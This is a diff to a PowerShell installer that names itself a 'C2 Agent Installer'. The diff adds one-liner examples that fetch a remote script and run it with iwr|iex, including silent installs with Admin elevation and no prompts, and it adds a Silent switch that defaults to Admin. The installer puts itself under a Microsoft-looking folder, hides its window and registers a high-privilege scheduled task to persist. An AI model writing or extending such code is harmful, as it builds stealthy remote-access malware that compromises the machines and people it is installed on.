@@ -8,14 +8,28 @@
     - Admin (Default): Requires/Requests elevation, registers High-privilege task, updates Machine PATH.
     - Normal: Runs as current user, registers User-level task, updates User PATH only.
 
+.EXAMPLES
+    # Interactive mode (prompts for admin)
+    iwr -useb https://your-url/install.ps1 | iex
+    
+    # Auto-install as Admin (silent, no prompts)
+    iwr -useb https://your-url/install.ps1 | iex; Install -Mode Admin -Silent
+    
+    # Auto-install as Normal user (silent, no elevation)
+    iwr -useb https://your-url/install.ps1 | iex; Install -Mode Normal -Silent
+    
+    # Alternative: Pass parameters via invoke
+    & ([ScriptBlock]::Create((iwr -useb https://your-url/install.ps1))) -Mode Admin -Silent
+
 .NOTES
     Run with: irm https://your-gist-url/install.ps1 | iex
 #>
 
 param(
     [string]$InstallPath = "$env:LOCALAPPDATA\Microsoft\Windows\SystemCache",
-    [string]$Mode = "Admin", # Options: "Admin", "Normal"
-    [switch]$Force
+    [string]$Mode = "", # Options: "Admin", "Normal", or empty for prompt
+    [switch]$Force,
+    [switch]$Silent  # Skip all prompts
 )
 
 $ErrorActionPreference = "Stop"
@@ -45,18 +59,26 @@ Clear-Host
 # =============================================================================
 
 Clear-Host
-# Interactive Admin Prompt
-if (-not (Test-Admin)) {
-    Write-Host "C2 Agent Installer" -ForegroundColor Cyan
-    $response = Read-Host "Run with Administrator privileges (Recommended for full features)? (y/n)"
-    
-    if ($response -match "^[yY]") {
-        $Mode = "Admin"
+
+# Determine Mode if not already set
+if ([string]::IsNullOrEmpty($Mode)) {
+    # Interactive Admin Prompt (only if not silent)
+    if (-not (Test-Admin) -and -not $Silent) {
+        Write-Host "C2 Agent Installer" -ForegroundColor Cyan
+        $response = Read-Host "Run with Administrator privileges (Recommended for full features)? (y/n)"
+        
+        if ($response -match "^[yY]") {
+            $Mode = "Admin"
+        } else {
+            $Mode = "Normal"
+        }
     } else {
-        $Mode = "Normal"
+        # Silent mode or already admin - default to Admin
+        $Mode = "Admin"
     }
 } else {
-    $Mode = "Admin" # Already admin, default to admin mode
+    # Mode explicitly provided via parameter
+    # Keep the provided value
 }
 
 # Hiding Window Immediately after user interaction
